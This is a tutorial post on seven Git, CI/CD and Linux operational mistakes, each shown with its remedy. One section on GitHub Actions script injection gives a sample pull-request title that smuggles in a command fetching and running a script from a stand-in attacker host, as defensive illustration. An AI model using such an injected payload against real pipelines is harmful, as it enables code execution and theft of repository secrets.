# Day 15: 7 Critical Antipatterns in Git, CI/CD & Linux Backend Systems

In production systems, operational mistakes at the version control, continuous integration, or Linux server layers cause more critical outages and security breaches than pure algorithmic bugs. Below are 7 architectural antipatterns commonly committed by junior and mid-level developers, accompanied by enterprise-grade remediations.

---

## 1. Using `git push --force` Instead of `--force-with-lease`

### The Mistake
After an interactive rebase or amending a commit on a branch, the developer runs:
```bash
# WRONG: Destroys any commits pushed by teammates to the remote branch
git push --force origin feature/billing-upgrade
```
If a colleague pushed a bugfix or rebased commit to `origin/feature/billing-upgrade` while you were working locally, `--force` blindly overwrites the remote reference, permanently wiping out their work from the remote branch.

### The Correct Approach
Always use `--force-with-lease` (or `--force-with-lease --force-if-includes`):
```bash
# CORRECT: Refuses to overwrite remote if upstream contains commits not present locally
git push --force-with-lease origin feature/billing-upgrade
```
`--force-with-lease` checks that your local tracking branch (`origin/feature/billing-upgrade`) matches the remote state before overwriting. If another engineer pushed new commits, Git rejects your push, alerting you to fetch and reconcile first.

---

## 2. Committing Secrets / `.env` Files (and Believing `git rm` Deletes Them)

### The Mistake
A developer accidentally commits an AWS access key or `.env` file, realizes their mistake, runs:
```bash
# WRONG: The secret is still permanently stored in Git's object database!
git rm .env
git commit -m "fix: remove leaked secret"
git push origin main
```
Because Git is a content-addressable DAG, the secret remains completely accessible in the historical commit's Tree and Blob objects. Automated security scanners (and scrapers) scan public commit histories within seconds.

### The Correct Approach
1. **Immediately revoke / rotate the leaked credential** in your cloud provider console. Once pushed, assume the secret is compromised.
2. Prevent commits before they happen using client-side pre-commit hooks and `.gitignore`.
3. Purge the secret from the entire Git object history using modern tools like `git-filter-repo` (or BFG Repo-Cleaner):
```bash
# CORRECT: Completely rewrite repo history to eliminate secret references
pip install git-filter-repo
git-filter-repo --path .env --invert-paths --force
git push origin --force --all
```

---

## 3. Rebasing Published or Shared Branches

### The Mistake
A developer runs `git rebase` on a shared long-lived branch like `main`, `staging`, or a collaborative team branch:
```bash
# WRONG: Rewrites commit SHAs on shared branches, causing divergent histories
git checkout main
git pull
git rebase feature/search-filters
git push --force origin main
```
Rebasing creates brand-new commit objects with different SHAs. When teammates pull, their local DAG branches diverge completely, leading to messy duplicate merge commits and broken pull requests.

### The Correct Approach
- **The Golden Rule**: Only rebase local, private feature branches before opening a PR.
- Never rewrite history on shared branches (`main`, `develop`, `staging`). Use standard 3-way merge or GitHub's PR squash/rebase-merge button:
```bash
# CORRECT: Bring main changes into your feature branch cleanly
git checkout feature/search-filters
git rebase main    # Safe: Only your private feature commits are rewritten
```

---

## 4. Unquoted Script Injection in GitHub Actions (`run:` Steps)

### The Mistake
Interpolating GitHub context expressions directly into inline shell commands:
```yaml
# WRONG: Extreme Security Vulnerability (Arbitrary Code Execution via PR Title)
- name: Log PR Information
  run: |
    echo "Title is: ${{ github.event.pull_request.title }}"
```
If an external contributor opens a pull request with the title:
`Fix docs"; curl -s https://attacker.com/malicious.sh | bash; echo "`
The runner executes the attacker's script, leaking your repository's `GITHUB_TOKEN` and repository secrets!

### The Correct Approach
Pass untrusted user inputs exclusively through environment variables:
```yaml
# CORRECT: Untrusted input is safely isolated in environment variables
- name: Log PR Information
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Title is: $PR_TITLE"
```
The shell processes `$PR_TITLE` as a literal data argument rather than evaluating it as shell executable code.

---

## 5. Unpinned and Uncached Dependencies in CI/CD Pipelines

### The Mistake
Running raw unpinned `pip install` commands on every single CI run without caching:
```yaml
# WRONG: Slow (5-10 min runtime), non-deterministic, vulnerable to upstream outages
- name: Install dependencies
  run: |
    pip install fastapi uvicorn redis
    pytest
```
Problems:
1. Every run takes minutes downloading identical wheels.
2. If `fastapi` releases a breaking change upstream, your CI suddenly breaks on unrelated PRs.
3. If PyPI suffers a momentary network blip, your entire build pipeline fails.

### The Correct Approach
Pin exact dependency versions using lockfiles (`poetry.lock`, `requirements.lock`, or `uv.lock`) and leverage runner caching:
```yaml
# CORRECT: Deterministic dependency lockfile with automatic caching
- name: Set up Python
  uses: actions/setup-python@v5
  with:
    python-version: "3.12"
    cache: "pip"
    cache-dependency-path: "requirements.lock"

- name: Install dependencies
  run: |
    python -m pip install --upgrade pip
    pip install --no-deps -r requirements.lock
```

---

## 6. Using `kill -9` (`SIGKILL`) as First-Line Process Termination

### The Mistake
When a backend Python or Uvicorn worker is unresponsive or needs reloading, an operator runs:
```bash
# WRONG: Destructive kernel termination with zero cleanup
kill -9 <PID>
```
`SIGKILL` cannot be caught, handled, or ignored by the process. The Linux kernel unconditionally wipes the process memory space:
- In-flight database transactions are abruptly severed without rolling back or closing connections cleanly, leaving PostgreSQL connections in idle/hung states.
- Redis pipeline buffers and local file writes are discarded before flushing to disk.
- Temporary files and file locks remain stranded in `/tmp`.

### The Correct Approach
Always send `SIGTERM` (`kill -15`) first, allowing the backend framework to execute its graceful shutdown routine:
```bash
# CORRECT: Request graceful shutdown, wait, and only fallback to SIGKILL if frozen
kill -15 <PID>

# Or in shell automation:
kill -TERM "$PID"
timeout 15 tail --pid="$PID" -f /dev/null || kill -KILL "$PID"
```
FastAPI and Uvicorn catch `SIGTERM`, stop accepting new HTTP connections, finish active requests within a configured timeout (e.g. 15s), close database connection pools, and exit cleanly with code 0.

---

## 7. Running Backend Containers and System Daemons as `root`

### The Mistake
Running Python web servers or Docker containers using the root user:
```dockerfile
# WRONG: Container runs as root (UID 0) by default
FROM python:3.12-slim
WORKDIR /app
COPY . .
RUN pip install -r requirements.txt
CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "80"]
```
If an attacker discovers an arbitrary file read/write vulnerability or remote code execution (RCE) flaw in your application or a third-party dependency, they possess root privileges inside the container, facilitating kernel escape and host file system takeover.

### The Correct Approach
Create and switch to an unprivileged dedicated user (e.g. `appuser`, UID 10001):
```dockerfile
# CORRECT: Hardened non-root user execution
FROM python:3.12-slim
WORKDIR /app

# Create dedicated non-root system group and user
RUN groupadd -g 10001 appgroup && \
    useradd -u 10001 -g appgroup -s /sbin/nologin -M appuser

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY --chown=appuser:appgroup . .

# Drop privileges to non-root user
USER appuser:appgroup

EXPOSE 8000
CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"]
```

---

## Summary Checklist
- [x] Protect team branches with `--force-with-lease`, never raw `--force`.
- [x] Pre-empt secret leaks via automated pre-commit scanners; purge history with `git-filter-repo` if leaks occur.
- [x] Never rebase public branches (`main`, `develop`).
- [x] Pass GitHub Actions event contexts through environment variables, not inline strings.
- [x] Pin CI dependencies via lockfiles and enable runner wheel caching.
- [x] Terminate backend workers with `SIGTERM` (`kill -15`) for graceful connection draining.
- [x] Never run production containers or Systemd services as `root`.
